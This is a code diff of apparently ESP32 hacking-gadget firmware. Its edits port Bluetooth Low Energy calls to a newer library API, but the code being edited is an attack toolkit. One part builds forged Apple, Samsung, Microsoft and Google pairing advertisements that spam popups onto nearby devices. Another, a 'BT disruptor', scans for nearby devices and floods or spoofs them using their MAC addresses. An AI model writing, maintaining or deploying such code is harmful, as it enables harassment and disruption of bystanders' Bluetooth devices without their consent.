@@ -177,7 +177,7 @@ static void dhBiiDrawDetail(int idx) {
   tft.setTextColor(CLR_TEXT_LO);
   tft.drawString("SEL: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
 
-  while (digitalRead(BTN_SELECT) == HIGH) delay(20);
+  dhWaitSelectPress();
   delay(200);
 }
 
@@ -193,19 +193,19 @@ static void dhRunBleInspector() {
   scan->setInterval(100);
   scan->setWindow(80);
 
-  BLEScanResults results = scan->start(6, false);
-  int n = results.getCount();
+  BLEScanResults* results = scan->start(6, false);
+  int n = results->getCount();
   dhBiiCount = 0;
 
   for (int i = 0; i < n && dhBiiCount < DH_BII_MAX; i++) {
-    BLEAdvertisedDevice d = results.getDevice(i);
+    BLEAdvertisedDevice d = results->getDevice(i);
     DH_BiiDevice& out = dhBiiDevs[dhBiiCount++];
     out.name = d.haveName() ? String(d.getName().c_str()) : "";
     out.address = String(d.getAddress().toString().c_str());
     out.rssi = d.getRSSI();
     out.companyId = 0xFFFF;
     if (d.haveManufacturerData()) {
-      const std::string data = d.getManufacturerData();
+      String data = d.getManufacturerData();
       if (data.length() >= 2) {
         out.companyId = (uint8_t)data[0] | ((uint16_t)(uint8_t)data[1] << 8);
       }
@@ -312,7 +312,7 @@ static void dhSpamSendApple(BLEAdvertising* adv) {
   uint8_t pkt[31] = { 0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01,
     DH_APPLE_MODELS[idx].prod[0], DH_APPLE_MODELS[idx].prod[1], 0x55 };
   for (int i = 10; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 31));
+  BLEAdvertisementData d; d.addData((char*)pkt, 31);
   adv->setAdvertisementData(d);
 }
 
@@ -322,7 +322,7 @@ static void dhSpamSendSamsung(BLEAdvertising* adv) {
   uint8_t pkt[27] = { 0x1B, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03,
     0x21, 0x01, 0x09, DH_SAMSUNG_MODELS[idx].id[0], DH_SAMSUNG_MODELS[idx].id[1],
     0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 27));
+  BLEAdvertisementData d; d.addData((char*)pkt, 27);
   adv->setAdvertisementData(d);
 }
 
@@ -336,7 +336,7 @@ static void dhSpamSendMS(BLEAdvertising* adv) {
   pkt[p++]=0x06+nameLen; pkt[p++]=0xFF; pkt[p++]=0x06; pkt[p++]=0x00;
   pkt[p++]=0x03; pkt[p++]=0x00; pkt[p++]=0x80;
   memcpy(&pkt[p], DH_MS_NAMES[idx], nameLen); p += nameLen;
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, p));
+  BLEAdvertisementData d; d.addData((char*)pkt, p);
   adv->setAdvertisementData(d);
 }
 
@@ -346,7 +346,7 @@ static void dhSpamSendGoogle(BLEAdvertising* adv) {
   uint8_t pkt[14] = { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
     0x06, 0x16, 0x2C, 0xFE,
     DH_GOOGLE_MODELS[idx].id[0], DH_GOOGLE_MODELS[idx].id[1], DH_GOOGLE_MODELS[idx].id[2] };
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 14));
+  BLEAdvertisementData d; d.addData((char*)pkt, 14);
   adv->setAdvertisementData(d);
 }
 
@@ -519,7 +519,7 @@ static void dhDtgUpdateFlood(BLEAdvertising* adv) {
   pkt[0]=0x02; pkt[1]=0x01; pkt[2]=0x06; pkt[3]=0x07; pkt[4]=0x03;
   for (int i = 5; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
   pkt[10]=dhDtgActive.macBytes[0]; pkt[11]=dhDtgActive.macBytes[1]; pkt[12]=dhDtgActive.macBytes[2];
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 31));
+  BLEAdvertisementData d; d.addData((char*)pkt, 31);
   adv->setAdvertisementData(d);
 }
 
@@ -528,7 +528,7 @@ static void dhDtgUpdateL2CAP(BLEAdvertising* adv) {
   pkt[4]=0x01; pkt[5]=0x00; pkt[6]=0x02; pkt[7]=0x00;
   for (int i = 8; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
   pkt[20]=dhDtgActive.macBytes[3]; pkt[21]=dhDtgActive.macBytes[4]; pkt[22]=dhDtgActive.macBytes[5];
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 31));
+  BLEAdvertisementData d; d.addData((char*)pkt, 31);
   adv->setAdvertisementData(d);
 }
 
@@ -538,7 +538,7 @@ static void dhDtgUpdateSpoof(BLEAdvertising* adv) {
   esp_ble_gap_set_rand_addr(spoofMac);
   uint8_t pkt[31]; pkt[0]=0x02; pkt[1]=0x01; pkt[2]=0x06; pkt[3]=0x03; pkt[4]=0x09; pkt[5]=0x54; pkt[6]=0x47;
   for (int i = 7; i < 31; i++) pkt[i] = (uint8_t)random(0, 256);
-  BLEAdvertisementData d; d.addData(std::string((char*)pkt, 31));
+  BLEAdvertisementData d; d.addData((char*)pkt, 31);
   adv->setAdvertisementData(d);
 }
 
@@ -577,12 +577,12 @@ static void dhRunBtDisruptor() {
 
   BLEScan* scan = BLEDevice::getScan();
   scan->setActiveScan(true); scan->setInterval(100); scan->setWindow(99);
-  BLEScanResults results = scan->start(5, false);
-  int n = results.getCount();
+  BLEScanResults* results = scan->start(5, false);
+  int n = results->getCount();
   dhDtgCount = 0;
 
   for (int i = 0; i < n && dhDtgCount < DH_DTG_MAX; i++) {
-    BLEAdvertisedDevice d = results.getDevice(i);
+    BLEAdvertisedDevice d = results->getDevice(i);
     DH_DisruptTarget& t = dhDtgTargets[dhDtgCount++];
     t.name = d.haveName() ? String(d.getName().c_str()) : "";
     t.mac = String(d.getAddress().toString().c_str());
